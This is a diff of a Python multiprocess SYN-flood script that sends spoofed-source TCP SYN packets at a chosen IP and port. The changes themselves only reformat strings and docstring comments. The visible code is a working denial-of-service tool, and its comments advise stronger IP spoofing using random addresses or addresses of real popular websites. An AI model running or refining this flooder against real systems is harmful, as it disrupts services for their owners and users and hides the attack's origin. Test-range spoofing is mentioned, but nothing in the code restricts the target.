@@ -1,20 +1,20 @@
-""" 
-Workers will have addresses looking like 15.15.X.Y 
-X will be the number of the worker so worker number 1 will be firing from 15.15.1.Y 
-Y will be iterating from 1 to 254 so every workers fires around 250 shots fro 250 different addresses all in the same range (to be easily detected as a test)
+""" ezSYN FLOOD MULTIPROCESS. 
 
-If you wish to use a better spoofing mechanism please make sure the source ip address (15.15.X.Y) is completely randomly generated or sourced from actual top 3000 websites (alexa) 
-
-
+#Workers will have addresses looking like 15.15.X.Y 
+#X will be the number of the worker so worker number 1 will be firing from 15.15.1.Y 
+#Y will be iterating from 1 to 254 so every workers fires around 250 shots fro 250 different addresses all in the same range (to be easily detected as a test)
+#If you wish to use a better spoofing mechanism please make sure the source ip address (15.15.X.Y) is completely randomly generated or sourced from actual top 3000 websites (alexa) 
 
 Usage:
   ezSYN_FLOOD_MULTIPROCESS.py <dst_ip> <dst_port> [--workers=<amount>] [--sleep=<seconds>]
+  
 Options:
-  -h, --help            Show options
-  --version             Version
-  --workers=<amount>    How many processes to fire [default: 4]
-  --sleep=<seconds>     How many seconds to sleep between shots [default: 0]
+  -h, --help            Show options.
+  --version             Version.
+  --workers=<amount>    How many processes to fire [default: 4].
+  --sleep=<seconds>     How many seconds to sleep between shots [default: 0].
 """
+
 from docopt import docopt
 import logging
 import sys
@@ -37,7 +37,7 @@ def flood(src_net: str, dst_ip: str, dst_port: int, sleep: int):
             try:
                 send(network_layer/transport_layer, verbose=False)
             except Exception as e:
-                print(f"[-] Something went terribly wrong: {e}")
+                print("[-] Something went terribly wrong: {e}".format(e=e))
                 sys.exit()
 
             if sleep != 0:
@@ -45,7 +45,7 @@ def flood(src_net: str, dst_ip: str, dst_port: int, sleep: int):
 
 
 def signal_handler(signal, frame):
-    print(f"\n[-] CTRL+C, quiting...")
+    print("\n[-] CTRL+C, quiting...")
     sys.exit(0)
 
 
@@ -62,12 +62,12 @@ def main(arguments):
         sys.exit()
 
     print("[!] Starting ez SYN MULTIPROCESS Flooder...")
-    print(f"[~] Our Workers: {workers}")
-    print(f"[~] Our Target: {dst_ip}")
+    print("[~] Our Workers: {workers}".format(workers=workers))
+    print("[~] Our Target: {dst_ip}".format(dst_ip=dst_ip))
 
     processes = []
     for worker in range(1, workers+1):
-        src_net = f"15.15.{worker}"
+        src_net = "15.15.{worker}".format(worker=worker)
         p = Process(target=flood, args=(src_net, dst_ip, dst_port, sleep), daemon=True)
         processes.append(p)
         p.start()
